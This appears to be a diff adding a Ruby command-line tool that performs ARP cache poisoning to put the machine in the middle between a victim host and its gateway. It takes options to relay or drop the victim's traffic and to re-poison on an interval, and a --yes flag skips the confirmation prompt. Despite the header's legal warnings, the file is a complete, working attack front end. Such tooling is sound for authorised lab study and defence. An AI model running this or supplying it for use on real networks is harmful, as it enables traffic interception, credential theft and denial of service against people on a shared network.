@@ -1,0 +1,65 @@
+#!/usr/bin/env ruby
+# frozen_string_literal: true
+
+# arp-spoof: ARP cache-poisoning man-in-the-middle, as a demonstration.
+#
+#   sudo arp-spoof -i eth0 -s 192.168.1.99 -m <attacker-mac> \
+#         --victim 192.168.1.50 --gateway 192.168.1.1 --duration 60
+#
+# ===================================================================
+#  WARNING: this intercepts other hosts' traffic. Running it against a
+#  network you do not own or are not explicitly authorized to test is
+#  ILLEGAL in most places. Use it only in a lab or under written
+#  authorization. You are responsible for what you do with it.
+# ===================================================================
+
+require "optparse"
+require "datalink"
+require "datalink/attack/arp_poison"
+
+options = { forward: true, interval: 2.0, duration: nil, yes: false }
+parser = OptionParser.new do |o|
+  o.banner = "Usage: arp-spoof -i IFACE -s SRC_IP -m SRC_MAC --victim IP --gateway IP"
+  o.on("-i", "--interface IFACE") { |v| options[:iface] = v }
+  o.on("-s", "--source-ip IP", "attacker IP (for ARP resolution)") { |v| options[:src_ip] = v }
+  o.on("-m", "--source-mac MAC", "attacker MAC") { |v| options[:src_mac] = v }
+  o.on("--victim IP") { |v| options[:victim] = v }
+  o.on("--gateway IP") { |v| options[:gateway] = v }
+  o.on("--[no-]forward", "relay traffic (on) or drop it (off)") { |v| options[:forward] = v }
+  o.on("--interval SEC", Float, "re-poison interval (default 2)") { |v| options[:interval] = v }
+  o.on("--duration SEC", Float, "stop after SEC seconds") { |v| options[:duration] = v }
+  o.on("--yes", "skip the confirmation prompt") { options[:yes] = true }
+  o.on("-h", "--help") { puts o; exit }
+end
+parser.parse!
+
+required = %i[iface src_ip src_mac victim gateway]
+missing = required.reject { |k| options[k] }
+abort "missing: #{missing.join(', ')}\n\n#{parser.help}" unless missing.empty?
+
+unless options[:yes]
+  warn "About to ARP-poison victim #{options[:victim]} and gateway #{options[:gateway]} on #{options[:iface]}."
+  warn "Only continue if you are authorized to test this network."
+  print "Type 'yes' to proceed: "
+  abort "aborted" unless $stdin.gets&.strip == "yes"
+end
+
+trap("INT") { warn "\nstopping ..."; $stop = true }
+
+Datalink::Socket.open(options[:iface]) do |sock|
+  atk = Datalink::Attack::ArpPoison.new(
+    sock,
+    attacker_mac: options[:src_mac],
+    attacker_ip: options[:src_ip],
+    victim_ip: options[:victim],
+    gateway_ip: options[:gateway],
+    forward: options[:forward],
+    interval: options[:interval],
+    logger: $stderr
+  )
+  # Let Ctrl-C interrupt the run cleanly.
+  runner = Thread.new { atk.run(duration: options[:duration]) }
+  sleep(0.2) until $stop || !runner.alive?
+  atk.stop
+  runner.join
+end
